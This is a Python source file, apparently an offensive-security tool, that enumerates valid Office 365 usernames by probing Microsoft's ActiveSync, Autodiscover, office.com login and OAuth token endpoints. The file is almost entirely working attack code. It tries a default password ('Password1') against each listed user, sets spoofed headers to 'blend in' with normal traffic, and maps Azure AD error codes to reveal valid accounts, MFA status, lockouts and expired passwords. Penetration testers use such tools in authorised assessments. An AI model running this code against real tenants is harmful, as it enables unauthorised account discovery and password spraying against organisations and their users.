#!/usr/bin/env python3
'''
Office365 User Enumeration script.
Enumerate valid usernames from Office 365 using ActiveSync or office.com login page.

Author: Quentin Kaiser <quentin@gremwell.com>
'''
import random
import re
import string
import argparse
import logging
import requests

try:
    import http.client as http_client
except ImportError:
    import httplib as http_client

def load_usernames(usernames_file):
    '''
    Loads a list of usernames from `usernames_file`.

    Args:
        usernames_file(str): filename of file holding usernames

    Returns:
        usernames(list): a list of usernames
    '''
    with open(usernames_file) as file_handle:
        return [line.strip() for line in file_handle.readlines()]

def o365enum_activesync(usernames):
    '''
    Check if `usernames` exists using ActiveSync.

    Args:
        usernames(list): list of usernames to enumerate
    '''
    headers = {
        "MS-ASProtocolVersion": "14.0",
        "User-Agent": "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro"
    }
    for username in usernames:
        state = 0
        for _ in range(0, args.num):
            response = requests.options(
                "https://outlook.office365.com/Microsoft-Server-ActiveSync",
                headers=headers,
                auth=(username, args.password)
            )

            if response.status_code == 200:
                state = 2
                break
            else:
                if 'X-MailboxGuid' in response.headers:
                    state = 1
                    break
        print("{},{}".format(username, state))

def o365enum_autodiscover(usernames):
    '''
    Check if `usernames` exists using Autodiscover v1.

    Args:
        usernames(list): list of usernames to enumerate
    '''
    headers = {
        "MS-ASProtocolVersion": "14.0",
        "User-Agent": "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro"
    }
    for username in usernames:
        state = 0
        for _ in range(0, args.num):
            response = requests.get(
                "https://outlook.office365.com/autodiscover/autodiscover.json"\
                    "/v1.0/{}?Protocol=Autodiscoverv1".format(username),
                headers=headers,
                allow_redirects=False
            )
            if response.status_code == 200:
                state = 1
                break
            elif response.status_code == 302 and \
                'outlook.office365.com' not in response.headers['Location']:
                state = 1
                break
        print("{},{}".format(username, state))

def o365enum_office(usernames):
    '''
    Checks if `usernames` exists using office.com method.

    Args:
        usernames(list): list of usernames to enumerate
    '''
    headers = {
        "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"\
            " (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"
    }
    # first we open office.com main page
    session = requests.session()
    response = session.get(
        "https://www.office.com",
        headers=headers
    )
    # we get the application identifier and session identifier
    client_id = re.findall(b'"appId":"([^"]*)"', response.content)
    # then we request the /login page which will redirect us to the authorize
    # flow
    response = session.get(
        "https://www.office.com/login?es=Click&ru=/&msafed=0",
        headers=headers,
        allow_redirects=True
    )
    hpgid = re.findall(b'hpgid":([0-9]+),', response.content)
    hpgact = re.findall(b'hpgact":([0-9]+),', response.content)

    if not client_id or not hpgid or not hpgact:
        raise Exception("An error occured when generating headers.")

    # we setup the right headers to blend in
    headers['client-request-id'] = client_id[0]
    headers['Referer'] = response.url
    headers['hpgrequestid'] = response.headers['x-ms-request-id']
    headers['canary'] = ''.join(
        random.choice(
            string.ascii_uppercase + string.ascii_lowercase + string.digits + "-_"
        ) for i in range(248)
    )
    headers['hpgid'] = hpgid[0]
    headers['Accept'] = "application/json"
    headers['hpgact'] = hpgact[0]
    headers['Origin'] = "https://login.microsoftonline.com"

    # we setup the base JSON object to submit
    payload = {
        "isOtherIdpSupported":True,
        "checkPhones":False,
        "isRemoteNGCSupported":True,
        "isCookieBannerShown":False,
        "isFidoSupported":False,
        "originalRequest": re.findall(b'"sCtx":"([^"]*)"', response.content)[0].decode('utf-8'),
        "forceotclogin":False,
        "isExternalFederationDisallowed":False,
        "isRemoteConnectSupported":False,
        "federationFlags":0,
        "isSignup":False,
        "isAccessPassSupported":True
    }

    for username in usernames:
        payload["username"] = username
        response = session.post(
            "https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US",
            headers=headers,
            json=payload
        )
        if response.status_code == 200:
            exists = not int(response.json()['IfExistsResult'])
        else:
            exists = -1
        print("{},{}".format(username, int(exists)))

def o365enum_msoloauth(usernames, url="https://login.microsoft.com"):
    '''
    Check if `usernames` exists using OAuthv2 "MSOLSpray" method by @dafthack:
    https://github.com/dafthack/MSOLSpray

    Args:
        usernames(list): list of usernames to enumerate
        url(string): Base URL to send request; Change to use proxies
    '''
    headers = {
        "User-Agent": "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro",
        "Accept": "application/json",
    }
    body = {
        "resource": "https://graph.windows.net",
        "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
        "client_info": '1',
        "grant_type": "password",
        "username": "placeholder",
        "password": args.password,
        "scope": "openid"
    }
    codes = {
        0: ['AADSTS50034'], # INVALID
        1: ['AADSTS50126'], # VALID
        3: ['AADSTS50079', 'AADSTS50076'], # MSMFA
        4: ['AADSTS50158'], # OTHER MFA
        5: ['AADSTS50053'], # LOCKED
        6: ['AADSTS50057'], # DISABLED
        7: ['AADSTS50055'], # EXPIRED
        8: ['AADSTS50128', 'AADSTS50059'], # INVALID TENANT
    }

    for username in usernames:
        state = -1
        body['username'] = username
        response = requests.post(
            url + '/common/oauth2/token',
            headers=headers,
            data=body
        )

        # States
        # 0 = invalid user
        # 1 = valid user
        # 2 = valid user/pass
        # 3 = MS MFA response
        # 4 = third-party MFA?
        # 5 = locked out
        # 6 = acc disabled
        # 7 = pwd expired
        # 8 = invalid tenant response
        if response.status_code == 200:
            state = 2
        else:
            respErr = response.json()['error_description']
            for k, v in codes.items():
                if any(e in respErr for e in v):
                    state = k
                    break
            if state == -1:
                logging.info(f"UNKERR: {respErr}")
        print("{},{}".format(username, state))


def o365enum(usernames, method="activesync"):
    '''
    Enumerate usernames using an available method
    '''
    print("username,valid")
    if method == "activesync":
        o365enum_activesync(usernames)
    elif method == "autodiscover":
        o365enum_autodiscover(usernames)
    elif method == "office.com":
        o365enum_office(usernames)
    elif method == "msol":
        o365enum_msoloauth(usernames)
    else:
        raise Exception("Invalid method provided.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
        description='Office365 User Enumeration Script')
    parser.add_argument('-u', '--userlist', required=True, type=str,\
        help='username list one per line')
    parser.add_argument('-p', '--password', default='Password1', type=str,\
        help='password to try')
    parser.add_argument('-n', '--num', default=3, type=int,\
        help='# of reattempts to remove false negatives')
    parser.add_argument('-v', '--verbose', default=False, action='store_true',\
        help='Enable verbose output at urllib level')
    parser.add_argument('-m', '--method', default='activesync', type=str,\
        choices=('activesync', 'autodiscover', 'office.com', 'msol'),\
        help='method to use')
    args = parser.parse_args()

    if args.verbose:
        http_client.HTTPConnection.debuglevel = 1
        logging.basicConfig(
            format="%(asctime)s: %(levelname)s: %(module)s: %(message)s"
        )
        logging.getLogger().setLevel(logging.DEBUG)
        requests_log = logging.getLogger("requests.packages.urllib3")
        requests_log.setLevel(logging.DEBUG)
        requests_log.propagate = True

    o365enum(load_usernames(args.userlist), args.method)
